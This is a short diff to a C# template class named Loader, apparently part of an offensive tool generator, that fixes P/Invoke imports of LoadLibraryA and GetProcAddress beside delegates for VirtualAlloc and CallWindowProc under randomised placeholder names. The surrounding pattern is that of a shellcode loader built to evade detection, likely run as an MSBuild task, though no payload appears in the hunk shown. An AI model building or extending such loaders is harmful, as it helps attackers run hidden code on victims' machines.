@@ -30,9 +30,9 @@ internal static class Loader
         delegate System.IntPtr {{virtualAllocDel}}(System.IntPtr a, uint s, uint t, uint p);
         delegate System.IntPtr {{callWindowProcDel}}(System.IntPtr f, System.IntPtr h, uint m, System.IntPtr w, System.IntPtr l);
 
-        [System.Runtime.InteropServices.DllImport("kernel32")]
+        [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "LoadLibraryA")]
         static extern System.IntPtr {{loadLib}}(string n);
-        [System.Runtime.InteropServices.DllImport("kernel32")]
+        [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "GetProcAddress")]
         static extern System.IntPtr {{getProc}}(System.IntPtr m, string p);
 
         public override bool Execute()
